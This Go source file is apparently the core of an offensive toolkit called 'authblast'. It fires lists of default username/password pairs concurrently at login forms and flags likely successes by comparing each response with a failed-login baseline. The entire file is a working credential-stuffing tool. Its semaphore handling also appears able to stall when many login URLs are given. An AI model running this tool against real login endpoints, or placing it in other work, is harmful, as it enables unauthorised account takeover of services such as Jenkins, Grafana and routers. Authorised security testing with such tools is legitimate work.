// authblast — OMEGA concurrent default-credential stuffer (Go core).
//
// Technology-fingerprinted default credential lists (Jenkins, Tomcat,
// Grafana, Jenkins, GitLab, WordPress, routers, admin panels ...) fired
// concurrently against discovered login endpoints. Detection: distinct
// status/redirect/location/length-band vs the failed-login baseline
// captured first per endpoint. CANDIDATE grade only — the operator
// verifies with one manual login before anything is reported as
// confirmed.
//
// OFFENSE-GATED at the Python layer (PTK_OFFENSE).
//
// Input (JSON stdin):
//   {"logins":["http://h/login"],"pairs":[["admin","admin"],...],
//    "user_field":"username","pass_field":"password",
//    "fail_pattern":"","concurrency":10,"timeout_ms":3000}
//
// Output (JSON stdout):
//   {"results":[{"login","user","pass","status","baseline_status",
//                "class"}]}
package main

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type input struct {
	Logins      []string   `json:"logins"`
	Pairs       [][]string `json:"pairs"`
	UserField   string     `json:"user_field"`
	PassField   string     `json:"pass_field"`
	FailPattern string     `json:"fail_pattern"`
	Concurrency int        `json:"concurrency"`
	TimeoutMs   int        `json:"timeout_ms"`
}

type row struct {
	Login          string `json:"login"`
	User           string `json:"user"`
	Pass           string `json:"pass"`
	Status         int    `json:"status"`
	BaselineStatus int    `json:"baseline_status"`
	Class          string `json:"class"`
}

func emit(v interface{}) {
	out, _ := json.Marshal(v)
	fmt.Println(string(out))
}

func randWord() string {
	b := make([]byte, 6)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func postForm(cl *http.Client, login, uf, pf, u, p, failPat string) (int, string, bool, string) {
	form := url.Values{}
	form.Set(uf, u)
	form.Set(pf, p)
	req, err := http.NewRequest("POST", login,
		strings.NewReader(form.Encode()))
	if err != nil {
		return 0, "", false, ""
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "omegablast/1.0")
	resp, err := cl.Do(req)
	if err != nil {
		return 0, "", false, ""
	}
	defer resp.Body.Close()
	sb := new(strings.Builder)
	sc := bufio.NewScanner(io.LimitReader(resp.Body, 32768))
	sc.Buffer(make([]byte, 32768), 32768)
	for sc.Scan() && sb.Len() < 16384 {
		sb.WriteString(sc.Text())
	}
	body := sb.String()
	loc := resp.Header.Get("Location")
	hit := failPat != "" && strings.Contains(strings.ToLower(body),
		strings.ToLower(failPat))
	return resp.StatusCode, body, hit, loc
}

func classify(st int, body, loc, failPat string, base struct {
	st   int
	body string
	fail bool
	loc  string
}) string {
	low := strings.ToLower(body)
	switch {
	case failPat != "":
		// explicit failure marker: success = marker ABSENT while the
		// baseline (a nonsense pair) shows it
		if base.fail && !strings.Contains(low, strings.ToLower(failPat)) {
			return "no-fail-marker"
		}
		return ""
	case loc != "" && base.loc == "":
		return "redirect-shift"
	case st != base.st:
		return "status-shift"
	case base.st == st && st == 200:
		for _, m := range []string{"logout", "dashboard", "welcome",
			"sign out", "log out"} {
			if strings.Contains(low, m) &&
				!strings.Contains(strings.ToLower(base.body), m) {
				return "success-content"
			}
		}
	}
	return ""
}

func main() {
	in, _ := io.ReadAll(bufio.NewReader(io.LimitReader(os.Stdin, 1<<20)))
	var cfg input
	if err := json.Unmarshal(in, &cfg); err != nil {
		emit(map[string]string{"error": "bad json input: " + err.Error()})
		return
	}
	if len(cfg.Logins) == 0 || len(cfg.Logins) > 128 ||
		len(cfg.Pairs) == 0 || len(cfg.Pairs) > 256 {
		emit(map[string]string{"error":
		"1..128 logins and 1..256 pairs required"})
		return
	}
	uf := cfg.UserField
	if uf == "" {
		uf = "username"
	}
	pf := cfg.PassField
	if pf == "" {
		pf = "password"
	}
	conc := cfg.Concurrency
	if conc <= 0 || conc > 50 {
		conc = 10
	}
	tm := cfg.TimeoutMs
	if tm <= 0 {
		tm = 3000
	}
	cl := &http.Client{Timeout: time.Duration(tm) * time.Millisecond,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return http.ErrUseLastResponse
			}
			return nil
		}}

	results := []row{}
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, conc)

	for _, login := range cfg.Logins {
		wg.Add(1)
		sem <- struct{}{}
		go func(login string) {
			defer wg.Done()
			defer func() { <-sem }()
			bSt, bBody, _, bLoc := postForm(cl, login, uf, pf,
				"omeganoexist"+randWord(), "omeganotapass"+randWord(),
				cfg.FailPattern)
			base := struct {
				st   int
				body string
				fail bool
				loc  string
			}{bSt, bBody,
				cfg.FailPattern != "" && strings.Contains(
					strings.ToLower(bBody),
					strings.ToLower(cfg.FailPattern)), bLoc}

			for _, pair := range cfg.Pairs {
				if len(pair) < 2 {
					continue
				}
				wg.Add(1)
				sem <- struct{}{}
				go func(pair []string) {
					defer wg.Done()
					defer func() { <-sem }()
					st, body, _, loc := postForm(cl, login, uf, pf,
						pair[0], pair[1], cfg.FailPattern)
					klass := classify(st, body, loc, cfg.FailPattern,
						base)
					if klass == "" {
						return
					}
					mu.Lock()
					results = append(results, row{login, pair[0],
						pair[1], st, base.st, klass})
					mu.Unlock()
				}(pair)
			}
		}(login)
	}
	wg.Wait()
	emit(map[string]interface{}{"results": results,
		"logins": len(cfg.Logins), "pairs": len(cfg.Pairs)})
}
